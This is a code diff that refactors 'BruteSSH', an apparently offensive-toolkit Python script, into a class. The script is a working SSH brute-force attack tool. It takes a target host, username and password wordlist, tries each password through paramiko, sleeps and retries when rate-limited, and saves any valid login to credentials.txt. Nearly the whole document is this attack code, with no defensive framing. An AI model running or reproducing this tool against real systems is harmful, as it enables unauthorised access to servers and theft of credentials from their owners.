@@ -1,215 +1,132 @@
 #!/usr/bin/python3
 
-# BruteSSH - SSH Brute Force Script
-
-# Imports all needed variables and packages
 from assets.banners import brutessh_banner
-from assets.designs import *
+from assets.colors import *
+from assets.designs import logo, author
+from assets.prefixes import invalid_input_prefix, eagleshell_prefix, rhost_prefix, wordlist_prefix, user_prefix
 from assets.properties import clear_screen
-from assets.redirect import redirect_eagleshell_brute_force
+from assets.shortcuts import Exit
+from .brute_force import BruteForce
 import os
 import paramiko
 import socket
 import time
 
 
-# Main Function
-def brutessh_main():
+class BruteSSH:
+    def __init__(self):
+        self.host_set = ''
+        self.user_set = ''
+        self.wordlist_set = ''
+        self.password_found = ''
+        self.password_tried = 0
+        self.configuration()
+        self.set_ready()
 
-    # Function that sets all
-    def set_all():
-        global password_found
-        global password_tried
-        global host_set
-        global user_set
-        global wordlist_set
-        host_set = ''
-        user_set = ''
-        wordlist_set = ''
-        password_found = ''
-        password_tried = 0
-        configuration()
-
-    # Function that takes some user input
-    def configuration():
-        try:
-            global host_set
-            global user_set
-            global wordlist_set
-            os.system(clear_screen)
-            print(logo)
-            print('')
-            print(line)
-            print(brutessh_banner)
-            print(line)
-            print('')
-            print(author)
-            print('Configuration:')
-            print('')
-            # hostname or IP address of the FTP server
-            print('\tHost Input')
-            print('\tExample: 10.10.10.15')
-            print('')
-            # username of the FTP server, root as default for linux
-            print('\tUser Input:')
-            print('\tExample: admin')
-            print('')
-            # password wordlist to brute force
-            print('\tWordlist Input')
-            print('\tExample: /usr/share/wordlists/mypasswords.txt')
-            print('')
-            print('\tZ): Back')
-            print('\tX): Exit')
-            print('')
-            while True:
-                host_set = input('\u001b[33mHOST \u001b[37m> ').lower()
-                if host_set == 'z':
-                    redirect_eagleshell_brute_force()
-                elif host_set == 'x':
-                    exit_shell()
-                user_set = input('\u001b[33mUSER \u001b[37m> ')
-                if user_set == 'z' or user_set == 'Z':
-                    redirect_eagleshell_brute_force()
-                elif user_set == 'x' or user_set == 'Z':
-                    exit_shell()
-                wordlist_set = input('\u001b[33mWORDLIST \u001b[37m> ')
-                if wordlist_set == 'z' or wordlist_set == 'Z':
-                    redirect_eagleshell_brute_force()
-                elif wordlist_set == 'x' or wordlist_set == 'X':
-                    exit_shell()
-                process()
-        except KeyboardInterrupt:
-            exit_shell()
-        except ValueError:
-            print('\t\u001b[31m[-] Unable To Connect.')
-            os.system('sleep 1')
-            brutessh_main()
-        except FileNotFoundError:
-            print('\t\u001b[31m[-] Unable To Connect.')
-            os.system('sleep 1')
-            brutessh_main()
-
-    # Function that displays before bruteforce
-    def process():
+    def header(self):
         os.system(clear_screen)
         print(logo)
-        print('')
-        print(line)
         print(brutessh_banner)
-        print(line)
-        print('')
         print(author)
-        print('Process:')
-        print('')
-        print('\tStatus')
-        print('\t------')
-        print('')
-        print('\tStop: CTRL+C')
-        print('')
-        set_ready()
-        result()
 
-    # Function that brute forces
-    def is_ssh_open(hostname, username, password):
-        global password_tried
-        global password_found
-        # initialize SSH client
+    def configuration(self):
+        try:
+            self.header()
+            print('Configuration:')
+            print('\n\tHost Input')
+            print('\tExample: 10.10.10.15')
+            print('\n\tUser Input:')
+            print('\tExample: admin')
+            print('\n\tWordlist Input')
+            print('\tExample: /usr/share/wordlists/mypasswords.txt')
+            print('\n\tZ): Back')
+            print('\tX): Exit\n')
+            while True:
+                self.host_set = input(rhost_prefix).lower()
+                if self.host_set == 'z':
+                    BruteForce()
+                elif self.host_set == 'x':
+                    Exit()
+                self.user_set = input(user_prefix)
+                if self.user_set == 'z' or self.user_set == 'Z':
+                    BruteForce()
+                elif self.user_set == 'x' or self.user_set == 'Z':
+                    Exit()
+                self.wordlist_set = input(wordlist_prefix)
+                if self.wordlist_set == 'z' or self.wordlist_set == 'Z':
+                    BruteForce()
+                elif self.wordlist_set == 'x' or self.wordlist_set == 'X':
+                    Exit()
+                break
+        except KeyboardInterrupt:
+            Exit()
+
+    def set_ready(self):
+        passwords = open(self.wordlist_set).read().split("\n")
+        for password in passwords:
+            if self.brute_forcing(self.host_set, self.user_set, password):
+                open("credentials.txt", "w").write(f"{self.user_set}@{self.host_set}:{password}")
+                break
+
+    def brute_forcing(self, hostname, username, password):
+        self.header()
+        print('Process:')
+        print('\n\tStatus')
+        print('\t------')
+        print('\n\tStop: CTRL+C\n')
         client = paramiko.SSHClient()
-        # add to know hosts
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         try:
             client.connect(hostname=hostname, username=username, password=password, timeout=3)
         except socket.timeout:
-            # this is when host is unreachable
-            print("\t\u001b[31m[!] Host: " + hostname + " is unreachable, timed out.")
+            print(RED + "\t[!] Host: " + hostname + " is unreachable, timed out." + WHITE)
             return False
         except paramiko.AuthenticationException:
-            print("\t\u001b[31m[!] Invalid credentials for " + username + ":" + password)
-            password_tried = password_tried + 1
+            print(RED + "\t[!] Invalid credentials for " + username + ":" + password + WHITE)
+            self.password_tried = self.password_tried + 1
             return False
         except paramiko.SSHException:
-            print("\t\u001b[36;1m[*] Quota exceeded, retrying with delay...")
-            # sleep for a minute
+            print(BLUE + "\t[*] Quota exceeded, retrying with delay..." + WHITE)
             time.sleep(60)
-            return is_ssh_open(hostname, username, password)
+            return self.brute_forcing(hostname, username, password)
         except paramiko.ssh_exception.NoValidConnectionsError:
-            print("\t\u001b[31m[!] Host: " + hostname + " is unreachable, timed out.")
+            print(RED + "\t[!] Host: " + hostname + " is unreachable, timed out." + WHITE)
             os.system('sleep 1')
-            brutessh_main()
+            BruteSSH()
         except KeyboardInterrupt:
-            result()
+            self.result()
         else:
-            # connection was established successfully
-            password_found = password
-            result()
+            self.password_found = password
+            self.succ_fail = True
+            self.result()
 
-    # Function that does the process
-    def set_ready():
-        # read the file
-        passwords = open(wordlist_set).read().split("\n")
-        # brute-force
-        for password in passwords:
-            if is_ssh_open(host_set, user_set, password):
-                # if combo is valid, save it to a file
-                open("credentials.txt", "w").write(f"{user_set}@{host_set}:{password}")
-                break
-
-    # Function that displays result
-    def result():
+    def result(self):
         try:
-            os.system(clear_screen)
-            print(logo)
-            print('')
-            print(line)
-            print(brutessh_banner)
-            print(line)
-            print('')
-            print(author)
+            self.header()
+            if self.succ_fail == True:
+                color = GREEN
+            else:
+                color = RED
             print('Result:')
-            print('')
-            if len(password_found) > 1:
-                print('\tHOST: \u001b[32;1m' + host_set + '\u001b[37m')
-                print('')
-                print('\tUSERNAME: \u001b[32;1m' + user_set + '\u001b[37m')
-                print('')
-                print('\tPASSWORD: \u001b[32;1m' + password_found + '\u001b[37m')
-                print('')
-                print('\tWORDLIST: \u001b[32;1m' + wordlist_set + '\u001b[37m')
-            else:
-                print('\t\u001b[37mHOST: \u001b[31m' + host_set + '\u001b[37m')
-                print('')
-                print('\t\u001b[37mUSERNAME: \u001b[31m' + user_set + '\u001b[37m')
-                print('')
-                print('\t\u001b[37mPASSWORD: \u001b[31mNot Found.\u001b[37m')
-                print('')
-                print('\t\u001b[37mWORDLIST: \u001b[31m' + wordlist_set + '\u001b[37m')
-            print('')
-            if len(password_found) > 1:
-                print('\tPASSWORDS TRIED: \u001b[32;1m' + str(password_tried) + '\u001b[37m')
-            else:
-                print('\tPASSWORDS TRIED: \u001b[31m' + str(password_tried) + '\u001b[37m')
-            print('')
-            print('\tX): Exit')
-            print('')
+            print('\n\tHOST: ' + color + self.host_set + WHITE)
+            print('\n\tUSERNAME: ' + color + self.user_set + WHITE)
+            print('\n\tPASSWORD: ' + color + self.password_found + WHITE)
+            print('\n\tWORDLIST: ' + color + self.wordlist_set + WHITE)
+            print('\n\tPASSWORDS TRIED: ' + color + str(self.password_tried) + WHITE)
+            print('\n\tY): New')
+            print('\tZ): Menu')
+            print('\tX): Exit\n')
+            os.system('sleep 0.01')
             while True:
-                eagleshell_cmd = input('\u001b[33mEagleShell \u001b[37m> ').lower()
-                if eagleshell_cmd == 'x':
-                    exit_shell()
+                cmd = input(eagleshell_prefix).lower()
+                if cmd == 'y':
+                    BruteSSH()
+                elif cmd == 'z':
+                    BruteForce()
+                elif cmd == 'x':
+                    Exit()
                 else:
-                    print('\u001b[31m[-] Invalid Input.')
+                    print(invalid_input_prefix)
                     continue
         except KeyboardInterrupt:
-            exit_shell()
-
-    # The function where you exit
-    def exit_shell():
-        print('\n\u001b[31m[-] Exiting EagleShell')
-        print('\u001b[0m')
-        os.system('sleep 2')
-        os.system(clear_screen)
-        exit()
-
-    set_all()
-
-
-brutessh_main()
+            Exit()
